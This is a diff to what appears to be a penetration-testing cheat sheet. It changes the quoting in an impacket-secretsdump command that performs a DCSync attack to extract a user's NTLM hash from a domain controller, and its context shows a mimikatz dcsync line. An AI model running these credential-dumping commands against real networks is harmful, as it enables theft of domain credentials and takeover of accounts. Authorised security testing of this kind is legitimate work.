@@ -18,7 +18,7 @@ lsadump::dcsync /user:<domain>/<username>
 % impacket, ad auth attacks, dcsync
 @ windows-variables
 # get ntlm hash for user via dcsync attack using impacket-secretsdump
-impacket-secretsdump -just-dc-user <TARGET_USERNAME> <domain>/<USERNAME_TO_AUTH_AS>:"<password>"@<dc_ip>
+impacket-secretsdump -just-dc-user <TARGET_USERNAME> <domain>/<USERNAME_TO_AUTH_AS>:'<password>'@<dc_ip>
 
 $ TARGET_USERNAME: if [[ -f "users.txt" ]]; then cat users.txt; fi
 $ USERNAME_TO_AUTH_AS: if [[ -f "users.txt" ]]; then cat users.txt; fi
